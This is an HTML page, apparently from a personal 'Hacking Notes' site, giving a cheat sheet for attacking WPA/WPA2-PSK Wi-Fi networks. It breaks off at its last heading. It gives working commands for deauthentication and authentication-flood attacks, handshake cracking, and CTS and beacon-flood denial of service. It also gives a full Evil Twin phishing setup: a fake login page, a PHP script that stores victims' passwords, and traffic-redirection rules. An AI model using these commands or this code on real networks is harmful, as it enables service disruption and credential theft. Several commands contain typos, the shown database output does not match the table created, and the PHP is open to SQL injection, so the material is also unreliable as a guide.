@@ -1,0 +1,722 @@
+<!DOCTYPE html>
+
+<html>
+	<head>
+		<meta charset="utf-8">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+
+		<!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hacking Wifi - WPA/WPA2 PSK | Hacking Notes</title>
+<meta name="generator" content="Jekyll v3.8.4" />
+<meta property="og:title" content="Hacking Wifi - WPA/WPA2 PSK" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Introduction" />
+<meta property="og:description" content="Introduction" />
+<link rel="canonical" href="http://0.0.0.0:4000/hackingnotes/hacking-wifi/wpa-wpa2-psk/" />
+<meta property="og:url" content="http://0.0.0.0:4000/hackingnotes/hacking-wifi/wpa-wpa2-psk/" />
+<meta property="og:site_name" content="Hacking Notes" />
+<script type="application/ld+json">
+{"description":"Introduction","url":"http://0.0.0.0:4000/hackingnotes/hacking-wifi/wpa-wpa2-psk/","@type":"Article","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://0.0.0.0:4000/hackingnotes/siteicon.png"}},"headline":"Hacking Wifi - WPA/WPA2 PSK","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+
+		<link type="application/atom+xml" rel="alternate" href="http://0.0.0.0:4000/hackingnotes/feed.xml" title="Hacking Notes" />
+
+		<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:400,400italic,700,700italic|Open+Sans:400,400italic,600,600italic,700,700italic|Inconsolata:400,700">
+		<link rel="stylesheet" href="/hackingnotes/css/main.css">
+		<link rel="apple-touch-icon" href="/hackingnotes/apple-touch-icon.png">
+		<link rel="icon" type="image/png" href="/hackingnotes/touch-icon.png" sizes="192x192">
+		<link rel="icon" type="image/png" href="/hackingnotes/images/favicon.png">
+
+		
+	</head>
+
+	<body>
+		<header>
+			<h1>
+				<a href="/hackingnotes/"><img src="/hackingnotes/images/emblem.svg" width="40" height="40" alt="Hacking Notes logo"></a>
+				Hacking Notes
+				<button type="button" class="open-nav" id="open-nav"></button>
+			</h1>
+
+			<form action="/hackingnotes/search/" method="get">
+				<input type="text" name="q" id="search-input" placeholder="Search" autofocus>
+				<input type="submit" value="Search" style="display: none;">
+			</form>
+
+			<nav class="full-navigation">
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/">What is this?</a>
+					</li>
+				</ul>
+
+				<ul>
+					
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/active-directory/ad-attacks/">Active Directory</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/client-side-attacks/evil-pdf/">Client Side Attacks</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/enumeration/host-discovery/">Enumeration</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/host-discovery/">Host Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/dns-enumeration/">DNS Enumeration</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/os-discovery/">OS Discovery</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/port-scanning/">Port Scanning</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/enumeration/waf-evasion/">WAF Evasion</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/exploiting/buffer-overflow/">Exploiting</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level current">
+							
+							<a href="/hackingnotes/hacking-wifi/theory/">Hacking Wifi</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/theory/">Theory</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wep/">Hacking Wifi - WEP</a></li>
+								
+									<li class="nav-item current"><a href="/hackingnotes/hacking-wifi/wpa-wpa2-psk/">Hacking Wifi - WPA/WPA2 PSK</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/hacking-wifi/wpa-wpa2-peap-enterprise/">Hacking Wifi - WPA/WPA2 PEAP (Enterprise)</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/other/hacking-aws/">Other</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-aws/">Hacking AWS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/other/hacking-with-powershell/">Hacking with PowerShell</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/post-exploitation/av-evasion/">Post Exploitation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/av-evasion/">AV Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-uac/">Bypass UAC</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/get-credentials/">Gathering Credentials</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/password-cracking/">Password Cracking</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/port-forwarding/">Port Forwarding and Tunneling</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/reverse-shell/">Reverse Shell</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/privilege-escalation/linux-privesc/">Privilege Escalation</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/linux-privesc/">Linux Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/windows-privesc/">Windows Privesc</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/privilege-escalation/run-commands-as/">Run Commands As</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/reconnaissance/information-gathering/">Reconnaissance</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/reconnaissance/information-gathering/">Information Gathering</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/services/ftp/">Services</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/dns/">PORT 53/tcp - DNS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/http/">PORT 80/tcp, 443/tcp - HTTP Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rpcbind/">PORT 111/tcp - RPCBind</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/imap/">PORT 143/tcp, 993/tcp - IMAP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/smb/">PORT 139/tcp, 445/tcp - SMB</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/snmp/">PORT 161/udp - SNMP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/java-rmi/">PORT 1100/tcp - Java RMI</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/sql-server/">PORT 1433/tcp - Microsoft SQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/nfs/">PORT 2049/tcp - NFS</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/mysql/">PORT 3306/tcp - MySQL Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/rdp/">PORT 3389/tcp - RDP</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/software/wordpress/">Software</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/wordpress/">WordPress</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/drupal/">Drupal</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/tomcat/">Tomcat</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
+							<a href="/hackingnotes/web/file-inclusion/">Web</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/file-inclusion/">File Inclusion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/login-panes/">Login Panes</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/sqli/">SQL Injection (SQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/nosqli/">NoSQL Injection (NoSQLi)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/templates-injections/">Server Side Templates Injections (SSTI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/unrestricted-file-upload/">Unrestricted File Upload</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/web/oauth-2.0-bypass/">OAuth 2.0 Bypass</a></li>
+								
+							</ul>
+						</li>
+					
+				</ul>
+
+				<ul>
+					<li class="nav-item top-level ">
+						
+						<a href="/hackingnotes/changelog/">Change Log</a>
+					</li>
+				</ul>
+			</nav>
+		</header>
+
+		<section class="main">
+			<div class="page-header">
+				<h2>Hacking Wifi</h2>
+				<h3>Hacking Wifi - WPA/WPA2 PSK</h3>
+			</div>
+			<article class="content">
+				<h1 id="introduction">Introduction</h1>
+
+<p><img src="/hackingnotes/images/wpa_psk.png" alt="WPA2-PSK Message Exchange" /></p>
+
+<h1 id="setup">Setup</h1>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo airmon-ng check kill
+sudo airmon-ng
+sudo airmon-ng start wlan0
+
+# Change MAC
+ifconfig wlan0mon down
+macchanger -s wlan0mon
+ifconfig wlan0mon up
+</code></pre></div></div>
+
+<p>To restart network services:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo airmon-ng stop wlan1mon
+sudo service NetworkManager restart
+</code></pre></div></div>
+
+<p>Start capturing:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 802.11.g is for 5GHz if you don't have the suitable hardwarte try to use --band ab
+sudo airodump-ng -c &lt;CH&gt; --bssid &lt;BSSID&gt; [--band abg] --write &lt;OUT_FILE&gt; &lt;IFACE&gt;
+</code></pre></div></div>
+
+<h1 id="handshake-capture-clients-needed">Handshake Capture (Clients needed)</h1>
+
+<h2 id="deauth">Deauth</h2>
+
+<p>Consist on deauthenticate a client in order to capture de re-authentication handshake.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aireplay-ng -0 10 -a &lt;BSSID&gt; -c &lt;CLIENT&gt; &lt;IFACE&gt;
+</code></pre></div></div>
+
+<h2 id="deauth-global">Deauth Global</h2>
+
+<p>The same term of deauthentication, but in that case using the brodcast MAC address in order to deauthenticate all clients.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airplay-ng -0 0 -e &lt;ESSID&gt; -c FF:FF:FF:FF:FF:FF &lt;IFACE&gt;
+</code></pre></div></div>
+
+<h2 id="auth-attack-or-authentication-dos-mode">Auth attack or Authentication DoS Mode</h2>
+
+<p>Could be sound strange, but if you authenticate 5000 clients to the Access Point is possible to kick out client of the network and then capture their handshake.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airplay-ng -1 0 -e &lt;ESSID&gt; -h 00:a0:8b:cd:02:65 &lt;IFACE&gt;  #To authenticate 1 client
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdk3 &lt;IFACE&gt; a -a &lt;BSSID&gt; #Authenticating clients until DoS
+</code></pre></div></div>
+
+<p>Finally the AP will eject the clients with less power rate.</p>
+
+<h2 id="dissassociation-amok-mode-attack">Dissassociation Amok Mode Attack</h2>
+
+<p>Same as deauthentication attack but mdk3 gives us the opportunity to introduce <code class="highlighter-rouge">allow/deny</code> lists.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>blacklist.txt:
+a0:e4:b2:45:f6:87
+
+mdk3 &lt;IFACE&gt; d -w blacklist.txt -c 1
+</code></pre></div></div>
+
+<h2 id="validating-the-handshake">Validating the handshake</h2>
+
+<p>Sometimes <code class="highlighter-rouge">aircrack-ng</code> tells us that it capture a handshake when it hasn’t. So we can validate it with <code class="highlighter-rouge">pyrit</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pyrit -r Capture-01.cap analyze
+</code></pre></div></div>
+
+<h2 id="filtering-the-capture">Filtering the capture</h2>
+
+<p>When we are trying to capture a handshake, maybe we are capturing a lot of packets, so we just need to filter that. (EAPOL -&gt; Handshakes) (wlan.fc.type_subtype==0x08 are Beacons) (wlan.fc.type_subtype==0x05 are Probe Response)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tshark -r Capture-01.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol" -F pcap 2&gt;/dev/null
+tshark -r Capture-01.cap -Y "wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol"  -w filteredCapture -F pcap 2&gt;/dev/null
+
+pyrit -r filteredCapture analyze
+</code></pre></div></div>
+
+<p>Also it is recommended filtering with the target BSSID.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tshark -r Capture-01.cap -Y "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53" -w filteredCapture -F pcap 2&gt;/dev/null
+</code></pre></div></div>
+
+<p>IF you want to do a doble analysis you may change <code class="highlighter-rouge">-Y</code> parameter to <code class="highlighter-rouge">-R "FILTER" -2</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tshark -r Capture-01.cap -R "(wlan.fc.type_subtype==0x08 || wlan.fc.type_subtype==0x05 || eapol) &amp;&amp; wlan.addr==20:34:fb:b1:c5:53" -2 -w filteredCapture -F pcap 2&gt;/dev/null
+</code></pre></div></div>
+
+<h2 id="hash-extraction">Hash extraction</h2>
+
+<p>First we need to save our handshaek in HCCAP to after use <code class="highlighter-rouge">hccap2john</code> and crack it.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng -J capture Capture-01.cap   # For john
+hccap2john capture.hccap &gt; handshake.hash 
+
+
+aricrack-ng -j capture Capture-01.cap   # For hashcat
+</code></pre></div></div>
+
+<h2 id="cracking-the-hanshake">Cracking the hanshake</h2>
+
+<h3 id="dictionary-attack">Dictionary Attack</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john --wordlist=/usr/share/wordlist/rockyou.txt handshake.hash --format=wpapsk
+john --show --format=wpapsk handshake.hash
+
+aircrack-ng -w /usr/share/wordlist/rockyou.txt Capture-01.cap
+
+hashcat -m 2500 -d 1 capture.hccapx /usr/share/wordlists/rockyou.txt --force -w 3
+hashcat --show -m 2500 capture.hccapx
+</code></pre></div></div>
+
+<h3 id="rainbow-table">Rainbow Table</h3>
+
+<p><strong>Airolib + Aircrack</strong></p>
+
+<p>With <code class="highlighter-rouge">airolib</code> we can create a dictionary with PMKS.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airolig-ng passwords-airolib --import passwd /usr/share/wordlists/rockyou.txt
+echo "&lt;ESSID&gt;" &gt; essid.lst
+airolib-ng passwords-airolib --import essid essid.lst
+
+airolib-ng passwords-airolib --stats   #Test if all is working correctly
+
+airolib-ng passwords-airolib --clean all  #Clean the wordlists to ileggible characters
+
+airolib-ng passwords-airolib --batch  #Create the wordlists
+</code></pre></div></div>
+
+<p>Onced created we just need to use aircrack</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>aircrack-ng -r passwords-airolib_Capture-01.cap
+</code></pre></div></div>
+
+<p>We can see that the speed of cracking of <code class="highlighter-rouge">aircrack-ng</code> goes from 10k/s up to 200k/s.</p>
+
+<p><strong>Genpmk + (Cowpatty or Pyrit)</strong></p>
+
+<p>First we need to create a new dictionary.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>genpmk -f /usr/share/wordlists/rockyou.txt -d dic.genpmk -s &lt;SSID&gt;
+</code></pre></div></div>
+
+<p>And crackit with Cowpatty:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cowpatty -d dic.genpmk -r Captura-01.cap -s &lt;ESSID&gt;  #Up to 360k/s
+</code></pre></div></div>
+
+<p>More faster? try with Pyrit:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pyrit -i dic.genpmk -e &lt;ESSID&gt; -r Captura-01.cap attack_cowpatty  #Up to 2M/s
+</code></pre></div></div>
+
+<p>You still want to go faster? Try pyrit with Database:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pyrit -i /usr/share/wordlists/rockyou.txt import_passwords
+pyrit -e &lt;ESSID&gt; create_essid
+pyrit batch
+
+#Finally attack
+
+pyrit -r Captura-01.cap attack_db  #Up to 20M/s
+</code></pre></div></div>
+
+<h1 id="dos-attacks">DoS attacks</h1>
+
+<h3 id="cts-frame-attack">CTS Frame Attack</h3>
+
+<p>The protocol 802.11 is CSMA CA, CA is Collision Avoidance, so in that protocol appear two new types of packets. CTS (Clear to Send) and RTS (Request to Send) that provides to the network the ability to avoid collisions between frames.</p>
+
+<p>What happens if we flood the network with 1000 CTS frames with the time field on his maximum value (30.000 us), if we flood with that TCP stream we will hijack all the bandwidth causing a Denial of Service.</p>
+
+<p>First we need to capture and modify one Clear-to-send frame and modify the Duration to 30.000 us and modify the RA address.</p>
+
+<p>Onced created out evil frame we just need to send several times to the network.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tcpreplay --intf1=&lt;IFACE&gt; --topspeed --loop=10000 evilframe.pcap 2&gt;/dev/null
+
+Actual: 10000 packets (460000 bytes) sent in 3.01 seconds
+Rated: 152428.1 Bps, 1.21 Mbps, 3313.65 pps
+Statistics for network device: wlx00c0caaba818
+        Successful packets:        10000
+        Failed packets:            0
+        Truncated packets:         0
+        Retried packets (ENOBUFS): 0
+        Retried packets (EAGAIN):  0
+</code></pre></div></div>
+
+<p>In that case we busy the channel for:</p>
+
+<script type="math/tex; mode=display">Time Busy = 10.000 packets * 30.000 us = 30s</script>
+
+<h3 id="beacon-flood-mode-attack">Beacon Flood Mode Attack</h3>
+
+<p>The beacon frame is a frame that contains information about the access point such as the channel where the AP is working, ciphers, protocols, etc.</p>
+
+<p>These type of beacons are transmitted in plain as other stations and devices need these frames to extract information in order to connect them.</p>
+
+<p>The idea of Beacon Flood Attack such as his name says, flood a large number of beacons in order to create a lot of ESSID in the same Chanel as the target AP in order to make it invisible for users.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Create a list of AP names:
+MyNetwork1
+MyNetwork2
+MyNetwork3
+MyNetwork4
+MyNetwork5
+MyNetwork6
+MyNetwork7
+MyNetwork8
+MyNetwork9
+MyNetwork10
+
+mdk3 &lt;IFACE&gt; b -f networks.txt -a -s 1000 -c &lt;CHANNEL&gt;   # -a -&gt; WPA2  -s &lt;speed&gt;
+</code></pre></div></div>
+
+<h3 id="michael-shutdown-explotation">Michael Shutdown Explotation</h3>
+
+<p>Can shut down APs using TKIP encryption and QoS Extension with 1 sniffed and 2 injected QoS Data Packets, but less effective.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mdk3 &lt;IFACE&gt; m -t &lt;BSSID&gt;
+</code></pre></div></div>
+
+<h1 id="evil-twin">Evil Twin</h1>
+
+<p>One of the most common techniques to obtain the password of a wireless network via phishing. It’s common that the devices emit Probe Request frames when their are not associated to any AP. These Probe Request frame ares packets that contain information about which SSID the device was connected before. So we can abuse of that information in order to create a Fake AP with the same SSID.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>thark -i &lt;IFACE&gt; -Y "wlan.fc.type_subtype==4" 2&gt;/dev/null
+   1 0.000000000 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1063, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
+    2 0.019968349 Apple_7d:1f:e9 → Broadcast    802.11 195 Probe Request, SN=1064, FN=0, Flags=........C, SSID=MOVISTAR_PLUS_2A51
+</code></pre></div></div>
+
+<h2 id="creating-dhcp-file">Creating DHCP file</h2>
+
+<p>/etc/dhcpd.conf</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>authoritative;
+default-lease-time 600;
+max-lease-time 7200;
+subnet 192.168.1.128 netmask 255.255.255.128 {
+option subnet-mask 255.255.255.128;
+option broadcast-address 192.168.1.255;
+option routers 192.168.1.129;
+option domain-name-servers 8.8.8.8;
+range 192.168.1.130 192.168.1.140;
+}
+</code></pre></div></div>
+
+<h2 id="configuring-the-web-page-login-router-wifi">Configuring the web page (LOGIN ROUTER WIFI)</h2>
+
+<p>Search and copy the html of a login webpage with the following action form:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;tr&gt;&lt;td&gt;&lt;form action="dbconnect.php" method="post"&gt;
+</code></pre></div></div>
+
+<p>And the appropriate <code class="highlighter-rouge">dbconnect.php</code></p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="nb">ob_start</span><span class="p">();</span>
+<span class="nv">$host</span><span class="o">=</span><span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span><span class="o">=</span><span class="s2">"fakeap"</span><span class="p">;</span>
+<span class="nv">$pass</span><span class="o">=</span><span class="s2">"fakeap"</span><span class="p">;</span>
+<span class="nv">$dbname</span><span class="o">=</span><span class="s2">"evilTwin"</span><span class="p">;</span>
+<span class="nv">$tbl_name</span><span class="o">=</span><span class="s2">"sniff"</span><span class="p">;</span>
+
+<span class="c1">// Create connection</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="nv">$host</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">,</span> <span class="nv">$dbname</span><span class="p">);</span>
+<span class="c1">// Check connection</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">die</span><span class="p">(</span><span class="s2">"Connection failed: "</span> <span class="o">.</span> <span class="nx">mysqli_connect_error</span><span class="p">());</span>
+<span class="p">}</span>
+
+
+<span class="nv">$username</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'username'</span><span class="p">];</span>
+<span class="nv">$password</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'password'</span><span class="p">];</span>
+
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"INSERT INTO sniff (username, password) VALUES ('</span><span class="nv">$username</span><span class="s2">', '</span><span class="nv">$password</span><span class="s2">')"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span> <span class="nv">$sql</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"New record created successfully"</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"Error: "</span> <span class="o">.</span> <span class="nv">$sql</span> <span class="o">.</span> <span class="s2">"&lt;br&gt;"</span> <span class="o">.</span> <span class="nx">mysqli_error</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="nx">mysqli_close</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+
+<span class="nb">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+<span class="nb">header</span><span class="p">(</span><span class="s2">"location:upgrading.html"</span><span class="p">);</span>
+<span class="nb">ob_end_flush</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<h2 id="initializazing-services">Initializazing services</h2>
+
+<p>We need to start apache2 and mysql</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>service apache2 start &amp;&amp; service mysql start
+</code></pre></div></div>
+
+<h2 id="configuring-mysql">Configuring MySQL</h2>
+
+<p>As we can see in <code class="highlighter-rouge">dbconnect.php</code> it’s trying to connect to a <code class="highlighter-rouge">evilTwin</code> db with <code class="highlighter-rouge">fakeap</code> user, so we just need to configure mysql properly.</p>
+
+<h3 id="creating-the-db">Creating the DB</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u root
+
+create database evilTwin;
+create table sniff(username varchar(32), password varchar(32));
+
+show tables;
+
++--------------------+
+| Tables_in_evilTwin |
++--------------------+
+| wpakeys            |
++--------------------+
+1 row in set (0.00 sec)
+
+insert into sniff(username, password) values ("TESTKEY", "TESTKEY");
+select * from sniff;
+
++-----------+-----------+
+| username  | password  |
++-----------+-----------+
+| TESTKEY   | TESTKEY   |
++-----------+-----------+
+1 row in set (0.00 sec)
+</code></pre></div></div>
+
+<h3 id="creating-a-user-for-the-db">Creating a user for the DB</h3>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -u root
+
+create user fakeap@localhost identified by 'fakeap';
+grant all privileges on evilTwin.* to 'fakeap'@'localhost';
+FLUSH PRIVILEGES;
+</code></pre></div></div>
+
+<p>At this point onced we introduced credentials via the web panel, it will be appended in our database.</p>
+
+<h2 id="creating-the-ap">Creating the AP</h2>
+
+<p>With <code class="highlighter-rouge">airbase</code> we can set up our fake AP without authentication:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>airbase-ng -e &lt;ESSID&gt; -c &lt;CHANNEL&gt; -P &lt;IFACE&gt;
+</code></pre></div></div>
+
+<h3 id="configuring-a-new-network-interface">Configuring a new network interface</h3>
+
+<p>Onced launched our new fake AP, we need to add a new network interface.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ifconfig at0 192.168.1.129 netmask 255.255.255.128
+route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129
+
+echo 1 &gt; /proc/sys/net/ipv4/ip_forward
+
+ifconfig at0
+
+at0: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
+        inet 192.168.1.129  netmask 255.255.255.128  broadcast 192.168.1.255
+        inet6 fe80::e670:b8ff:fed3:935c  prefixlen 64  scopeid 0x20&lt;link&gt;
+        ether e4:70:b8:d3:93:5c  txqueuelen 1000  (Ethernet)
+        RX packets 0  bytes 0 (0.0 B)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 57  bytes 8828 (8.6 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+</code></pre></div></div>
+
+<h3 id="configuring-ip-tables">Configuring IP tables</h3>
+
+<p>The idea is to redirect the traffic coming from victims from at0 to eth0 in order to give them connection to internet.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iptables --flush
+iptables --table nat --flush
+iptables --delete-chain
+iptables --table nat --delete-chain
+
+iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
+iptables --append FORWARD --in-interface at0 -j ACCEPT
+iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80
+iptables -t nat -A POSTROUTING -j MASQUERADE
+</code></pre></div></div>
+
+<h3 id="syncronize">Syncronize</h3>
+
+<p>Finally the last step is syncronize our rules to the fake AP.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcp.pid at0
+</code></pre></div></div>
+
+<h1 id="attacks-without-clients">Attacks without Clients</h1>
+
+<p>In this section we are not going to capture any type of handshake to obtain the hash or key. We are goin to attack the network in a client-less mode.</p>
+
+<h2 id="pkmid-attack">PKMID Attack</h2>
+
+<p>This attack allows us to break the technology using Pairwise Master Key Identifier (PKMID) which is a characteristic available in a lot of devices.</p>
+
+<h3 id="via-bettercap">Via Bettercap</h3>
+
+<p>The results will be exported on a pcap file.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bettercap -iface &lt;IFACE&gt;
+
+iface &gt;&gt; wifi.recon on
+iface &gt;&gt; wifi.show
+
+iface &gt;&gt; wifi.assoc all
+</code></pre></div></div>
+
+<h3 id="via-hcxdumptool">Via hcxdumptool</h3>
+
+<p>Same as bettercap, the results will be exported on a pcap file.</p>
+
